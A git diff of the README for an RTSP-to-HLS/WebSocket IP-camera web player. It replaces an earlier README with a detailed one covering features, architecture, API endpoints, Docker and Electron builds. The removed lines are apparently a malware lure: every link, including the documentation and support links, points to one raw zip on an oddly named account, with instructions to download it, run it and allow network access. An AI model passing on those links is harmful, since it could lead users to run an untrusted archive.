@@ -1,105 +1,308 @@
-# 🎥 rtsp-web-player - Watch Your IP Cameras Effortlessly
+# 🎥 RTSP Web Player
 
-## 🚀 Getting Started
+A multi-stream IP-camera viewer that runs in the browser, as a cross-platform
+desktop app (Electron), or in Docker.  It converts RTSP streams to either HLS
+(~6-10 s latency) or low-latency fragmented MP4 over WebSocket (~1-3 s) using
+FFmpeg, and also supports native WebRTC/WHEP sources and MJPEG streams.
 
-Welcome to the RTSP Web Player! This tool lets you easily watch multiple IP cameras on your computer. You do not need any browser plugins to get started. In this guide, we will walk you through the steps to download and run the RTSP Web Player application.
+## ✨ Features
 
-## 📦 Download the Application
+| Feature | Details |
+|---|---|
+| **Multi-stream grid** | 1 / 2 / 3-column layout, add/remove cameras at any time |
+| **HLS playback** | RTSP → HLS via FFmpeg (hls.js with auto-recovery) |
+| **Low-latency WebSocket** | RTSP → fMP4 → WebSocket via MSE (~1-3 s latency) |
+| **WebRTC / WHEP** | Native WebRTC source support via the WHEP protocol |
+| **MJPEG** | Direct MJPEG HTTP streams |
+| **Camera discovery** | ONVIF broadcast discovery + TP-Link Tapo cloud login |
+| **Cross-platform desktop** | Electron builds for Windows, macOS and Linux (FFmpeg bundled) |
+| **Docker** | Single-command containerised deployment |
 
-[![Download rtsp-web-player](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip%20Web%20Player-blue)](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip)
+---
 
-To download the RTSP Web Player, simply **visit this page to download**: [Releases Page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip).
+## 📐 Architecture
 
-## 📋 System Requirements
+```
+┌───────────────────────────────────────────────────────────────┐
+│  Browser / Electron (React + TypeScript + Tailwind)           │
+│                                                               │
+│  VideoPlayer.tsx                                              │
+│  ┌─────────┐  ┌──────────┐  ┌─────────┐  ┌────────────────┐ │
+│  │  HLS.js │  │ MSE + WS │  │ WebRTC  │  │  <video src>   │ │
+│  │  (hls)  │  │  (ws)    │  │ (WHEP)  │  │ (mjpeg/direct) │ │
+│  └────┬────┘  └────┬─────┘  └────┬────┘  └────────────────┘ │
+└───────┼────────────┼─────────────┼───────────────────────────┘
+        │ HTTP       │ WebSocket   │ HTTP (SDP)
+┌───────▼────────────▼─────────────┘
+│  Node.js / Express backend  (server/)                         │
+│                                                               │
+│  streamManager.js      RTSP ──► FFmpeg ──► HLS segments       │
+│  webSocketManager.js   RTSP ──► FFmpeg ──► fMP4 ──► WS        │
+│  cameraDiscovery.js    ONVIF / Tapo discovery                 │
+└───────────────────────────────────────────────────────────────┘
+```
 
-Make sure your computer meets these minimum requirements to run the RTSP Web Player smoothly:
+---
 
-- **Operating System:** Windows 10 or later, macOS, or Linux
-- **Memory:** At least 4 GB of RAM
-- **Processor:** Dual-core CPU or better
-- **Network:** High-speed internet connection for streaming
+## 📦 Download (Desktop App)
 
-## 🛠️ Installation Steps
+Pre-built desktop installers are attached to every
+[GitHub Release](../../releases/latest).
 
-1. **Download the Application**
-   
-   Visit the [Releases Page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip) to find the latest version. Click on the download link for your operating system.
+| Platform | File | Notes |
+|---|---|---|
+| **Windows** | `RTSP-Web-Player-Setup-x.y.z.exe` | NSIS installer (recommended) |
+| **Windows** | `RTSP-Web-Player-x.y.z.exe` | Portable — no install needed |
+| **macOS** | `RTSP-Web-Player-x.y.z.dmg` | Drag to Applications |
+| **macOS** | `RTSP-Web-Player-x.y.z-mac.zip` | Unzip and run |
+| **Linux** | `RTSP-Web-Player-x.y.z.AppImage` | `chmod +x *.AppImage && ./RTSP-Web-Player*.AppImage` |
+| **Linux** | `RTSP-Web-Player-x.y.z.deb` | `sudo dpkg -i *.deb` |
 
-2. **Locate the Downloaded File**
+> **FFmpeg is bundled** inside the desktop app — no separate installation needed.
 
-   Go to your computer's "Downloads" folder or the location where you saved the file. You should see a file named something like `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip` for Windows or `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip` for Mac.
+### macOS Gatekeeper note
+Because the app is not notarised by default, macOS will block it on first
+launch.  Right-click (or Control-click) the app icon and choose **Open**, then
+confirm in the dialog.  To build a signed/notarised version, see
+[Code Signing](#code-signing-electron) below.
 
-3. **Extract the Zip File**
+---
 
-   - For Windows: Right-click the `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip` file and select "Extract All."
-   - For macOS: Double-click the `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip` file to unzip it.
+## 🚀 Quick Start
 
-4. **Run the Application**
+### Option A — Web Mode (browser only)
 
-   Locate the extracted folder. Inside, you will find the application file:
+Requires Node.js 18+ and FFmpeg installed on the host.
 
-   - On Windows, double-click `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip`.
-   - On macOS, double-click `https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip`.
+```bash
+# 1. Install dependencies
+npm run setup
 
-5. **Grant Permissions**
+# 2. Start the backend (Terminal 1)
+npm run server
 
-   The first time you run the application, your system might ask for permission to access your network. This is necessary to stream video from your IP cameras. Click "Allow."
+# 3. Start the frontend dev server (Terminal 2)
+npm run dev
+```
 
-## 🎥 Features
+Open **http://localhost:5173** in your browser.
 
-- **Multiple Camera Support**: Watch multiple IP camera feeds at once in a responsive grid layout.
-- **Easy Stream Management**: The integrated REST API allows you to manage your camera streams easily.
-- **HLS Format**: The application converts RTSP streams to HLS format for smooth playback.
+### Option B — Electron Desktop App (development)
 
-## 🌐 How to Use
+```bash
+npm run setup
+npm run electron:dev
+```
 
-1. **Add Your IP Cameras**
+### Option C — Docker
 
-   Once the application opens, you will see an option to add your IP camera URLs. Enter the addresses of your cameras in the format: `rtsp://your-camera-ip`. 
+```bash
+docker compose up --build
+```
 
-2. **Start Streaming**
+- Frontend → **http://localhost:80**
+- Backend API → **http://localhost:3001**
 
-   Click the "Start" button to begin streaming the camera feeds. You will see the video in real-time.
+> The `VITE_API_URL` environment variable controls which backend URL the
+> browser frontend uses.  Set it to your server's public IP/hostname when
+> deploying remotely:
+>
+> ```bash
+> VITE_API_URL=http://192.168.1.100:3001 docker compose up --build
+> ```
 
-3. **Manage Streams**
+---
 
-   Use the built-in controls to start, stop, and rearrange your camera views as needed.
+## 📋 Prerequisites (web/server mode)
 
-## 📂 Troubleshooting Tips
+| Requirement | Version | Purpose |
+|---|---|---|
+| Node.js | 18 + | Runtime |
+| FFmpeg | any modern | RTSP transcoding |
+| npm | 9 + | Package management |
 
-- **Cannot Access Camera Stream?** Ensure the IP address is correct and that your internet is working.
-- **Video Lag or Poor Quality?** Try lowering the resolution settings in the application or check your network speed.
+**FFmpeg installation:**
 
-## 💬 Frequently Asked Questions
+```bash
+# Ubuntu / Debian
+sudo apt update && sudo apt install ffmpeg
 
-### What is RTSP?
+# macOS (Homebrew)
+brew install ffmpeg
 
-RTSP stands for Real-Time Streaming Protocol. It enables the transfer of video and audio streams over the internet.
+# Windows
+# Download from https://ffmpeg.org/download.html and add to PATH
+```
 
-### What is HLS?
+---
 
-HLS, or HTTP Live Streaming, allows you to stream video content over the internet efficiently. It is compatible with most modern web browsers and devices.
+## 🎥 Adding Cameras
 
-### Do I need any plugins?
+Click the **+** button (bottom right) and enter:
 
-No, the RTSP Web Player runs entirely in your web browser. You do not need any additional plugins to use it.
+| Field | Example |
+|---|---|
+| Name | Front Door |
+| URL | `rtsp://admin:pass@192.168.1.100:554/stream1` |
 
-## 📞 Support
+For RTSP URLs, two conversion modes are available:
 
-If you experience any issues or have questions about the RTSP Web Player, please visit the [support page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip) to report an issue or ask for help from the community.
+- **HLS (default)** — most compatible, ~6-10 s latency
+- **Low-latency WebSocket** — ~1-3 s latency, requires H.264 source and Chrome/Edge
+
+For non-RTSP sources, select the stream type manually:
+
+| Type | URL format | Description |
+|---|---|---|
+| `hls` | `http://…/stream.m3u8` | HTTP Live Streaming |
+| `mjpeg` | `http://…/video.mjpg` | Motion JPEG |
+| `webrtc` | `http://…/whep` | WebRTC WHEP endpoint |
+| `ws` | `ws://…/api/ws-streams/id/live` | WebSocket fMP4 stream |
+
+---
+
+## 🌐 Backend API
+
+All endpoints are served at `http://localhost:3001`.
+
+### HLS Streams (RTSP → HLS)
+
+| Method | Path | Description |
+|---|---|---|
+| `GET` | `/api/health` | Health check |
+| `GET` | `/api/streams` | List active HLS streams |
+| `POST` | `/api/streams` | Start a new HLS stream `{ id, rtspUrl }` |
+| `GET` | `/api/streams/:id` | Get stream info |
+| `DELETE` | `/api/streams/:id` | Stop stream |
+
+### WebSocket Streams (RTSP → low-latency fMP4)
+
+| Method | Path | Description |
+|---|---|---|
+| `GET` | `/api/ws-streams` | List active WS streams |
+| `POST` | `/api/ws-streams` | Start a new WS stream `{ id, rtspUrl }` |
+| `GET` | `/api/ws-streams/:id` | Get stream info |
+| `DELETE` | `/api/ws-streams/:id` | Stop stream |
+| `WS` | `/api/ws-streams/:id/live` | WebSocket connection for fMP4 data |
+
+### Camera Discovery
+
+| Method | Path | Description |
+|---|---|---|
+| `POST` | `/api/discovery/start` | Start ONVIF/Tapo discovery |
+| `GET` | `/api/discovery/status` | Discovery progress |
+| `GET` | `/api/discovery/devices` | Discovered devices |
+| `POST` | `/api/discovery/test` | Test camera credentials |
+| `POST` | `/api/discovery/rtsp-urls` | Generate RTSP URL suggestions |
+| `DELETE` | `/api/discovery/clear` | Clear discovered devices |
+
+---
+
+## 🏗️ Building the Desktop App
+
+```bash
+# Install all dependencies first
+npm run setup
+
+# Build for the current platform
+npm run electron:build
+
+# Outputs are placed in release/
+```
+
+### Cross-platform builds
+
+Each platform **must be built on a matching host** (or CI runner):
+
+| Platform | Build host |
+|---|---|
+| Windows | `windows-latest` |
+| macOS | `macos-latest` |
+| Linux | `ubuntu-latest` |
+
+The included [GitHub Actions release workflow](.github/workflows/release.yml)
+handles all three platforms automatically when you push a version tag:
+
+```bash
+git tag v1.0.0
+git push origin v1.0.0
+```
+
+### Code signing (Electron)
+
+**macOS** — add these repository secrets in GitHub → Settings → Secrets:
+
+| Secret | Value |
+|---|---|
+| `CSC_LINK` | Base64-encoded `.p12` certificate (export from Keychain) |
+| `CSC_KEY_PASSWORD` | Certificate passphrase |
+
+**Windows** — add `WIN_CSC_LINK` / `WIN_CSC_KEY_PASSWORD` to the workflow env.
+
+Without secrets, the builds still succeed but will be unsigned.
+
+---
+
+## 🐳 Docker Reference
+
+```bash
+# Build and start
+docker compose up --build -d
+
+# View logs
+docker compose logs -f
+
+# Stop
+docker compose down
+
+# Rebuild after code changes
+docker compose up --build
+```
+
+### Environment variables
+
+| Variable | Default | Description |
+|---|---|---|
+| `PORT` | `3001` | Backend API port |
+| `STATIC_PORT` | `80` | Frontend static server port |
+| `VITE_API_URL` | `http://localhost:3001` | Backend URL seen by the browser |
+
+---
+
+## 🔧 Configuration
+
+The frontend detects automatically whether it's running inside Electron or a
+browser and configures the API base URL accordingly.  In browser mode, set
+`VITE_API_URL` at build time:
+
+```bash
+VITE_API_URL=http://my-server:3001 npm run build
+```
+
+---
+
+## 🐛 Troubleshooting
+
+| Problem | Solution |
+|---|---|
+| Video doesn't load | Check the backend is running (`npm run server`) |
+| "FFmpeg not found" | Install FFmpeg or use the desktop app (FFmpeg bundled) |
+| High latency | Use the **Low-latency WebSocket** mode when adding the camera |
+| macOS blocks the app | Right-click → Open → confirm in Gatekeeper dialog |
+| Linux AppImage won't run | Run `chmod +x *.AppImage` first |
+| WebRTC stream fails | Verify the WHEP endpoint URL and that the camera is reachable |
+
+---
 
 ## 🤝 Contributing
 
-If you'd like to contribute to the project, visit our [GitHub page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip) for details on how to get involved.
+1. Fork the repository
+2. Create a feature branch (`git checkout -b feature/my-feature`)
+3. Commit your changes
+4. Push and open a Pull Request
 
-## 🔗 Additional Resources
+---
 
-- [FFmpeg Documentation](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip)
-- [https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip Documentation](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip)
-- [React Documentation](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip)
+## 📄 License
 
-## 🔄 Update the Application
-
-To ensure you have the latest features and fixes, regularly check for updates on the [Releases Page](https://github.com/Circulatory-rhizopogonidahoensis173/rtsp-web-player/raw/refs/heads/claude/rtsp-web-player-011CUwjNUHTk9JXhx3AoXPSE/public/web_rtsp_player_v2.6.zip).
-
-Thank you for choosing RTSP Web Player! Enjoy streaming your IP cameras with ease.
+MIT — see [LICENSE](LICENSE) for details.
